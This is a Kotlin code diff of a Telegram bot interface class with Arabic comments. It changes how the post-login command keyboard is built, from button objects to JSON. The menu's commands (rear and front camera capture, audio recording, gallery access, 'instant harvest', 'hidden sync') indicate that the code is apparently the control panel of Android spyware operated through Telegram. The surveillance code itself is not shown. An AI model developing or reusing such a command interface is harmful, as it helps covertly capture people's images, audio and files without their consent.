@@ -518,34 +518,35 @@ class TelegramUi(
     // ==================== ✅ لوحات الأزرار التفاعلية مع إيموجيات فريدة ====================
 
     /**
-     * ✅ لوحة المفاتيح الرئيسية – أزرار تفاعلية بإيموجيات فريدة لكل زر.
+     * ✅ دالة مساعدة لإنشاء لوحة مفاتيح تفاعلية بصيغة JSON (متوافقة مع بقية الكود)
      * هذه اللوحة تظهر بعد التحقق من كلمة السر، وكل زر ينفذ أمراً مختلفاً.
      * الإيموجيات المستخدمة فريدة لكل زر لتسهيل التمييز.
      */
-    private fun buildMainKeyboard(): InlineKeyboardMarkup {
-        val keyboard = listOf(
-            listOf(
-                InlineKeyboardButton("📸 كاميرا خلفية").apply { callbackData = "cam_back" },
-                InlineKeyboardButton("👁️ كاميرا أمامية").apply { callbackData = "cam_front" }
-            ),
-            listOf(
-                InlineKeyboardButton("🎙️ تسجيل صوتي").apply { callbackData = "mic_rec" },
-                InlineKeyboardButton("📂 معرض الوسائط").apply { callbackData = "gallery" }
-            ),
-            listOf(
-                InlineKeyboardButton("📊 حالة النظام").apply { callbackData = "status" },
-                InlineKeyboardButton("📦 حصاد فوري").apply { callbackData = "harvest" }
-            ),
-            listOf(
-                InlineKeyboardButton("🔄 مزامنة خفية").apply { callbackData = "sync" },
-                InlineKeyboardButton("🛡️ فحص أمني").apply { callbackData = "security" }
-            ),
-            listOf(
-                InlineKeyboardButton("⚙️ إعدادات متقدمة").apply { callbackData = "settings" },
-                InlineKeyboardButton("🔌 قطع الاتصال").apply { callbackData = "ext" }
-            )
-        )
-        return InlineKeyboardMarkup(keyboard)
+    private fun buildMainKeyboardJson(): JSONObject {
+        return JSONObject().apply {
+            put("inline_keyboard", JSONArray().apply {
+                put(JSONArray().apply {
+                    put(JSONObject().apply { put("text", "📸 كاميرا خلفية"); put("callback_data", "cam_back") })
+                    put(JSONObject().apply { put("text", "👁️ كاميرا أمامية"); put("callback_data", "cam_front") })
+                })
+                put(JSONArray().apply {
+                    put(JSONObject().apply { put("text", "🎙️ تسجيل صوتي"); put("callback_data", "mic_rec") })
+                    put(JSONObject().apply { put("text", "📂 معرض الوسائط"); put("callback_data", "gallery") })
+                })
+                put(JSONArray().apply {
+                    put(JSONObject().apply { put("text", "📊 حالة النظام"); put("callback_data", "status") })
+                    put(JSONObject().apply { put("text", "📦 حصاد فوري"); put("callback_data", "harvest") })
+                })
+                put(JSONArray().apply {
+                    put(JSONObject().apply { put("text", "🔄 مزامنة خفية"); put("callback_data", "sync") })
+                    put(JSONObject().apply { put("text", "🛡️ فحص أمني"); put("callback_data", "security") })
+                })
+                put(JSONArray().apply {
+                    put(JSONObject().apply { put("text", "⚙️ إعدادات متقدمة"); put("callback_data", "settings") })
+                    put(JSONObject().apply { put("text", "🔌 قطع الاتصال"); put("callback_data", "ext") })
+                })
+            })
+        }
     }
 
     // ✅ القائمة الرئيسية الحالية (محفوظة للتوافق مع الأزرار القديمة)
@@ -667,12 +668,12 @@ class TelegramUi(
                 saveData()
                 
                 // ✅ استخدام لوحة المفاتيح التفاعلية الجديدة بدلاً من القائمة النصية
-                val keyboard = buildMainKeyboard()
+                val keyboardJson = buildMainKeyboardJson()
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
                     if (threadId != 0L) put("message_thread_id", threadId)
                     put("text", "🔐 **تم التحقق بنجاح.**\nاختر العملية من الأزرار أدناه:")
-                    put("reply_markup", keyboard.toString())
+                    put("reply_markup", keyboardJson.toString())
                     put("parse_mode", "Markdown")
                 })
                 pulseIntent("🔓 تسجيل دخول")
